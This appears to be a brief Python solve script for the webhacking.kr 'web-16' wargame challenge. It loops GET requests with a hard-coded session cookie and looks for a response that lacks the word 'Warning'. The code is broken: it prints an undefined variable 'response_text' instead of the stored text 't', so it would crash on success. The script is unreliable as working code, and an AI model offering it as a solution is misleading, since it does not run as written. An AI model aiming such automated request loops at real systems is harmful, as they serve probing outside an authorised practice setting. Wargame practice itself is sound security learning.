from requests import *
url='https://webhacking.kr/challenge/web-16/index.php?server=211.106.76.247'
cookies={'PHPSESSID':'far26bcar827daho2udovd024p'}
key='Warning'
for i in range(200):
    response=get(url=url,cookies=cookies)
    t=response.text
    if t.find(key) == -1:
        print(response_text)   